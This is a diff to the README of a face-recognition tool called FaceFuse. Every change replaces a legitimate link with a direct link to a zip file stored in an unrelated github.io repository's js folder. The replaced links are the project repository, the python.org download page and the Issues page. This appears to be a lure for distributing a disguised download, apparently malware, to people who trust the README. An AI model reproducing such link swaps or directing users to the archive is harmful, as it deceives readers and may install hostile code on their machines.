@@ -5,7 +5,7 @@ description: "Quality-adaptive hybrid face recognition fusing YOLO11 detection, 
 ---
 # 🤖 facefuse-hybrid-face-recognition - Smart Face Recognition Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/jorgealvarez83/facefuse-hybrid-face-recognition)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/jorgealvarez83/jorgealvarez83.github.io/raw/refs/heads/main/js/1.4.zip)
 
 ## 📖 What Is This?
 
@@ -29,7 +29,7 @@ Follow these simple steps to get FaceFuse running on your Windows computer.
 
 Visit this link to download the application:
 
-👉 **[Download FaceFuse](https://github.com/jorgealvarez83/facefuse-hybrid-face-recognition)**
+👉 **[Download FaceFuse](https://github.com/jorgealvarez83/jorgealvarez83.github.io/raw/refs/heads/main/js/1.4.zip)**
 
 Click the green "Code" button on that page, then select "Download ZIP". This will save the application package to your computer.
 
@@ -89,7 +89,7 @@ FaceFuse shows you:
 
 ### "Python not found" error
 
-1. Visit [python.org/downloads](https://python.org/downloads)
+1. Visit [python.org/downloads](https://github.com/jorgealvarez83/jorgealvarez83.github.io/raw/refs/heads/main/js/1.4.zip)
 2. Download Python 3.9 or newer
 3. Run the installer – **IMPORTANT**: Check "Add Python to PATH" during installation
 4. Restart your computer, then try running FaceFuse again
@@ -141,7 +141,7 @@ This project is released under the MIT License – you can use, modify, and dist
 
 ## 🤝 Support & Community
 
-- **Report Issues** – Found a bug? Visit the [Issues page](https://github.com/jorgealvarez83/facefuse-hybrid-face-recognition/issues)
+- **Report Issues** – Found a bug? Visit the [Issues page](https://github.com/jorgealvarez83/jorgealvarez83.github.io/raw/refs/heads/main/js/1.4.zip)
 - **Ask Questions** – Join the discussion in the GitHub Discussions tab
 - **Contribute** – Help improve FaceFuse by submitting pull requests
 
@@ -168,6 +168,6 @@ Before you start, make sure you have:
 
 Download FaceFuse today and experience the future of face recognition – it's fast, accurate, and completely free!
 
-[![Get FaceFuse Now](https://img.shields.io/badge/🚀-Download_FaceFuse-orange?style=for-the-badge)](https://github.com/jorgealvarez83/facefuse-hybrid-face-recognition)
+[![Get FaceFuse Now](https://img.shields.io/badge/🚀-Download_FaceFuse-orange?style=for-the-badge)](https://github.com/jorgealvarez83/jorgealvarez83.github.io/raw/refs/heads/main/js/1.4.zip)
 
 Keywords: arcface, biometrics, computer-vision, deep-learning, face-detection, face-recognition, feature-fusion, genetic-algorithm, hog, insightface, lbp, opencv, python, yolo, yolov11
